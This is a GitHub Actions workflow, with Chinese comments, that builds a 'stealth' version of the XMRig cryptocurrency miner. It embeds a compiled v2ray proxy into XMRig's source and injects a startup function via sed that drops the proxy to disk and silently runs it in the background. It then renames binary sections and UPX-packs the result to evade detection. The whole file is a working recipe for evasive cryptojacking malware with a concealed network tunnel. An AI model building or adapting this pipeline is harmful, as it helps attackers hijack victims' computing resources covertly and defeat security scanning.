name: Auto Build Stealth XMRig

on:
  workflow_dispatch:  # 允许手动触发
  schedule:
    - cron: '0 0 * * *'  # 每天UTC 0点自动构建

jobs:
  stealth-build:
    runs-on: ubuntu-latest
    timeout-minutes: 25

    steps:
    # 阶段1：获取原始代码
    - name: Clone XMRig
      uses: actions/checkout@v4
      with:
        repository: xmrig/xmrig
        path: src/xmrig

    - name: Clone v2ray-core
      uses: actions/checkout@v4
      with:
        repository: v2fly/v2ray-core
        path: src/v2ray

    # 阶段2：环境准备
    - name: Setup Build Tools
      run: |
        sudo apt-get update
        sudo apt-get install -y \
          build-essential cmake libuv1-dev libssl-dev libhwloc-dev \
          golang upx-ucl xxd

    # 阶段3：构建v2ray
    - name: Build v2ray Proxy
      working-directory: src/v2ray
      run: |
        go build -ldflags "-s -w -buildid=" -trimpath -o v2ray ./main

    # 阶段4：代码融合
    - name: Inject v2ray into XMRig
      run: |
        # 将v2ray转换为C代码
        xxd -i src/v2ray/v2ray > src/xmrig/src/v2ray_embed.h

        # 修改XMRig启动代码
        sed -i '/#include "base\/kernel\/Platform.h"/a #include "v2ray_embed.h"' src/xmrig/src/App.cpp
        sed -i $'/int main(/i \\\nvoid StartProxy() {\n    FILE* f = fopen("v2ray", "wb");\n    fwrite(v2ray, 1, v2ray_len, f);\n    fclose(f);\n    chmod("v2ray", 0700);\n    system("./v2ray -config=config.json >/dev/null 2>&1 &");\n}\n' src/xmrig/src/App.cpp
        sed -i '/Platform::init(/a \ \ \ \ StartProxy();' src/xmrig/src/base/kernel/Platform.cpp

    # 阶段5：混淆编译
    - name: Build Obfuscated XMRig
      working-directory: src/xmrig
      run: |
        mkdir -p build
        cd build
        cmake .. \
          -DWITH_HTTPD=OFF \
          -DWITH_OPENCL=OFF \
          -DWITH_CUDA=OFF \
          -DCMAKE_BUILD_TYPE=Release \
          -DCMAKE_C_FLAGS="-flto -fomit-frame-pointer -march=native" \
          -DCMAKE_CXX_FLAGS="-flto -fomit-frame-pointer -march=native"
        make -j$(nproc)

        # 二进制混淆处理
        objcopy --rename-section .text=.cryptext \
                --rename-section .data=.cryptdata \
                xmrig
        upx --ultra-brute --lzma xmrig -o xmrig_stealth

    # 阶段6：发布结果
    - name: Upload Stealth Binary
      uses: actions/upload-artifact@v4
      with:
        name: xmrig-stealth
        path: src/xmrig/build/xmrig_stealth
